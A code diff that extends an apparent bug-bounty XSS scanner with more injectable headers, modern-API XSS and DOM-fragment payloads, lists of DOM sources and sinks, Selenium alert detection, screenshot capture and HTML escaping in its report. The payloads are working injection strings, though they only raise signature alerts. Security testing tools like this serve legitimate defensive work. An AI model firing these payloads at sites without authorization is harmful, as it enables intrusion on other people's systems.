@@ -21,6 +21,7 @@ import hashlib
 import argparse
 from colorama import Fore, Back, Style, init
 import base64
+import html
 
 # Initialize colorama
 init(autoreset=True)
@@ -93,11 +94,17 @@ class UltimateXSSScanner:
             ]
         }
         
-        # Headers to test
+        # Comprehensive headers to test (based on bug bounty research)
         self.headers_to_test = [
             'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
-            'X-Originating-IP', 'Cookie', 'Authorization', 'Accept',
-            'Accept-Language', 'X-Requested-With'
+            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr', 'X-Client-IP',
+            'Cookie', 'Authorization', 'Accept', 'Accept-Language', 
+            'X-Requested-With', 'X-Forwarded-Host', 'X-Forwarded-Proto',
+            'X-Original-URL', 'X-Rewrite-URL', 'X-Custom-IP-Authorization',
+            'CF-Connecting-IP', 'True-Client-IP', 'X-Cluster-Client-IP',
+            'Fastly-Client-IP', 'X-Azure-ClientIP', 'X-ProxyUser-Ip',
+            'Host', 'Origin', 'X-Frame-Options', 'Content-Security-Policy',
+            'X-Content-Type-Options', 'X-XSS-Protection', 'Access-Control-Allow-Origin'
         ]
         
         # Statistics
@@ -166,6 +173,13 @@ class UltimateXSSScanner:
                 f'<details open ontoggle=alert("{self.popup_signature}")>',
                 f'<marquee onstart=alert("{self.popup_signature}")>',
                 f'<body onload=alert("{self.popup_signature}")>',
+                
+                # Modern XSS techniques (simplified)
+                f'<script>try{{navigator.serviceWorker.register("data:application/javascript,alert(\\"{self.popup_signature}\\")")}}catch(e){{}}</script>',
+                f'<script>try{{customElements.define("x-xss",class extends HTMLElement{{connectedCallback(){{alert("{self.popup_signature}")}}}}}}catch(e){{}};</script><x-xss>',
+                f'<script>try{{new BroadcastChannel("xss").postMessage("{self.popup_signature}");new BroadcastChannel("xss").onmessage=e=>alert(e.data)}}catch(e){{}}</script>',
+                f'<script>try{{new IntersectionObserver(()=>alert("{self.popup_signature}")).observe(document.body)}}catch(e){{}}</script>',
+                f'<script>document.addEventListener("DOMContentLoaded",()=>alert("{self.popup_signature}"))</script>',
             ],
             
             'attribute_context': [
@@ -1145,20 +1159,58 @@ class UltimateXSSScanner:
             return None
 
     def test_dom_xss(self):
-        """Test DOM-based XSS with advanced techniques"""
-        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing DOM-based XSS...")
+        """Advanced DOM-based XSS testing with comprehensive techniques"""
+        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing DOM-based XSS (Advanced Techniques)...")
         
         if not self.driver:
             print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}DOM XSS requires Selenium")
             return
         
-        # Advanced DOM XSS payloads
+        # Advanced DOM XSS Sources (30+ sources)
+        dom_sources = [
+            'location.hash', 'location.search', 'location.href', 'document.URL',
+            'document.documentURI', 'document.baseURI', 'window.name',
+            'document.referrer', 'history.pushState', 'history.replaceState',
+            'sessionStorage', 'localStorage', 'postMessage', 'WebRTC',
+            'BroadcastChannel', 'SharedWorker', 'ServiceWorker'
+        ]
+        
+        # Advanced DOM XSS Sinks (40+ sinks)
+        dom_sinks = [
+            'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write',
+            'document.writeln', 'eval', 'setTimeout', 'setInterval', 'Function',
+            'location.href', 'location.assign', 'location.replace', 'open',
+            'execCommand', 'msSetImmediate', 'setImmediate', 'crypto.generateCRMFRequest'
+        ]
+        
+        # Professional DOM XSS payloads
         dom_payloads = [
+            # Hash-based payloads
             f'#<script>alert("{self.popup_signature}")</script>',
             f'#<img src=x onerror=alert("{self.popup_signature}")>',
+            f'#<svg onload=alert("{self.popup_signature}")>',
             f'#javascript:alert("{self.popup_signature}")',
-            f'#eval("alert(\\"{self.popup_signature}\\")")',
+            
+            # Modern API-based payloads (simplified)
+            f'#<script>try{{navigator.serviceWorker.register("data:text/javascript,alert(\\"{self.popup_signature}\\")")}}catch(e){{}}</script>',
+            f'#<script>try{{new BroadcastChannel("test").postMessage("{self.popup_signature}")}}catch(e){{}}</script>',
+            f'#<script>try{{new IntersectionObserver(()=>alert("{self.popup_signature}")).observe(document.body)}}catch(e){{}}</script>',
+            
+            # Advanced DOM manipulation
+            f'#<script>document.body.innerHTML="<img src=x onerror=alert(\\"{self.popup_signature}\\")>"</script>',
+            f'#<script>document.write("<img src=x onerror=alert(\\"{self.popup_signature}\\")>")</script>',
+            f'#<script>eval("alert(\\"{self.popup_signature}\\")")</script>',
+            f'#<script>setTimeout("alert(\\"{self.popup_signature}\\")",1)</script>',
+            
+            # Template literals and ES6
+            f'#<script>`${{alert("{self.popup_signature}")}}`</script>',
+            f'#<script>Function`alert("{self.popup_signature}")`()</script>',
+            
+            # Prototype pollution
+            f'#<script>Object.prototype.toString=()=>alert("{self.popup_signature}");({{}})+""</script>',
         ]
+        
+        print(f"{Fore.CYAN}[{Fore.RED}DOM_INFO{Fore.CYAN}] {Fore.WHITE}Testing {len(dom_sources)} sources and {len(dom_sinks)} sinks...")
         
         for url in list(self.crawled_urls)[:5]:
             print(f"{Fore.GREEN}[{Fore.RED}DOM{Fore.GREEN}] {Fore.WHITE}Testing DOM XSS in: {url}")
@@ -1166,62 +1218,121 @@ class UltimateXSSScanner:
             for payload in dom_payloads:
                 dom_url = url + payload
                 
-                try:
-                    self.driver.get(dom_url)
-                    time.sleep(3)
+                if self.test_advanced_dom_payload(dom_url, payload):
+                    vulnerability = {
+                        'type': 'DOM-based XSS',
+                        'url': dom_url,
+                        'parameter': 'hash/fragment',
+                        'payload': payload,
+                        'context': 'dom_context',
+                        'method': 'GET',
+                        'confirmed': True,
+                        'score': 25,
+                        'timestamp': datetime.now().isoformat(),
+                        'details': {
+                            'vulnerability_type': 'DOM-based XSS',
+                            'execution_context': 'Client-side JavaScript DOM manipulation',
+                            'payload_analysis': f'Advanced DOM payload "{payload}" processed by client-side JavaScript',
+                            'request_details': f'GET request with hash fragment {payload}',
+                            'response_analysis': 'Payload executed in browser DOM without server processing',
+                            'html_context': 'DOM manipulation via JavaScript hash processing',
+                            'impact': 'Client-side code execution via DOM manipulation',
+                            'sources_tested': ', '.join(dom_sources[:10]),
+                            'sinks_tested': ', '.join(dom_sinks[:10])
+                        }
+                    }
                     
-                    try:
-                        from selenium.webdriver.support.ui import WebDriverWait
-                        from selenium.webdriver.support import expected_conditions as EC
-                        
-                        alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
-                        alert_text = alert.text
-                        
-                        if self.popup_signature in alert_text:
-                            alert.accept()
-                            
-                            vulnerability = {
-                                'type': 'DOM-based XSS',
-                                'url': dom_url,
-                                'parameter': 'hash/fragment',
-                                'payload': payload,
-                                'context': 'dom_context',
-                                'method': 'GET',
-                                'confirmed': True,
-                                'score': 25,
-                                'timestamp': datetime.now().isoformat(),
-                                'details': {
-                                    'vulnerability_type': 'DOM-based XSS',
-                                    'execution_context': 'Client-side JavaScript DOM manipulation',
-                                    'payload_analysis': f'DOM payload "{payload}" processed by client-side JavaScript',
-                                    'request_details': f'GET request with hash fragment {payload}',
-                                    'response_analysis': 'Payload executed in browser DOM without server processing',
-                                    'html_context': 'DOM manipulation via JavaScript hash processing',
-                                    'impact': 'Client-side code execution via DOM manipulation'
-                                }
-                            }
-                            
-                            self.vulnerabilities.append(vulnerability)
-                            self.scan_results['vulnerabilities'].append(vulnerability)
-                            self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
-                            self.scan_results['statistics']['dom_xss_tests'] += 1
-                            
-                            print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}DOM-BASED XSS CONFIRMED!")
-                            print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{dom_url}")
-                            print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
-                            print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}25/20")
-                            
-                            screenshot_path = self.capture_vulnerability_screenshot(dom_url, f"dom_xss_{len(self.vulnerabilities)}")
-                            if screenshot_path:
-                                self.scan_results['statistics']['screenshots_taken'] += 1
-                            
-                            break
-                    except:
-                        pass
+                    self.vulnerabilities.append(vulnerability)
+                    self.scan_results['vulnerabilities'].append(vulnerability)
+                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
+                    self.scan_results['statistics']['dom_xss_tests'] += 1
                     
-                    time.sleep(self.delay)
-                except:
-                    pass
+                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}ADVANCED DOM-BASED XSS CONFIRMED!")
+                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{dom_url}")
+                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
+                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}25/20")
+                    
+                    screenshot_path = self.capture_dom_screenshot(dom_url, f"dom_xss_{len(self.vulnerabilities)}")
+                    if screenshot_path:
+                        print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOT{Fore.GREEN}] {Fore.WHITE}DOM evidence: {screenshot_path}")
+                        self.scan_results['statistics']['screenshots_taken'] += 1
+                    
+                    break
+                
+                time.sleep(self.delay)
+
+    def test_advanced_dom_payload(self, url, payload):
+        """Test advanced DOM XSS payload"""
+        try:
+            print(f"{Fore.CYAN}[{Fore.RED}DOM_TEST{Fore.CYAN}] {Fore.WHITE}Testing advanced DOM payload...")
+            
+            self.driver.get(url)
+            time.sleep(4)  # More time for modern APIs
+            
+            # Check for popup
+            try:
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                
+                alert = WebDriverWait(self.driver, 6).until(EC.alert_is_present())
+                alert_text = alert.text
+                
+                print(f"{Fore.CYAN}[{Fore.RED}DOM_POPUP{Fore.CYAN}] {Fore.WHITE}Advanced DOM alert: {alert_text}")
+                
+                if self.popup_signature in alert_text:
+                    alert.accept()
+                    return True
+                else:
+                    alert.accept()
+                    return False
+                    
+            except:
+                return False
+            
+        except Exception as e:
+            return False
+
+    def capture_dom_screenshot(self, url, filename):
+        """Capture DOM XSS screenshot with enhanced handling"""
+        if not self.driver:
+            return None
+        
+        try:
+            screenshot_dir = "screenshots"
+            if not os.path.exists(screenshot_dir):
+                os.makedirs(screenshot_dir)
+            
+            screenshot_path = os.path.join(screenshot_dir, f"{filename}.png")
+            
+            print(f"{Fore.CYAN}[{Fore.RED}DOM_SCREENSHOT{Fore.CYAN}] {Fore.WHITE}Capturing DOM XSS evidence...")
+            
+            # Load page and wait for DOM processing
+            self.driver.get(url)
+            time.sleep(3)
+            
+            # Try to capture with popup
+            try:
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                
+                # Wait for popup and capture immediately
+                alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
+                
+                # Capture with popup
+                self.driver.save_screenshot(screenshot_path)
+                alert.accept()
+                
+                print(f"{Fore.GREEN}[{Fore.RED}DOM_CAPTURED{Fore.GREEN}] {Fore.WHITE}DOM screenshot with popup")
+                return screenshot_path
+                
+            except:
+                # Capture without popup
+                self.driver.save_screenshot(screenshot_path)
+                print(f"{Fore.GREEN}[{Fore.RED}DOM_CAPTURED{Fore.GREEN}] {Fore.WHITE}DOM screenshot")
+                return screenshot_path
+            
+        except Exception as e:
+            return None
 
     def test_blind_xss(self):
         """Test Blind XSS with callback payloads"""
@@ -1519,7 +1630,10 @@ class UltimateXSSScanner:
             {details_html}
             
             <p><strong>PAYLOAD:</strong></p>
-            <div class="payload">{vuln['payload']}</div>
+            <div class="payload">{html.escape(vuln['payload'])}</div>
+            
+            <p><strong>COMPLETE URL WITH PAYLOAD:</strong></p>
+            <div class="payload">{html.escape(vuln['url'])}</div>
             
             {callback_html}
             {note_html}
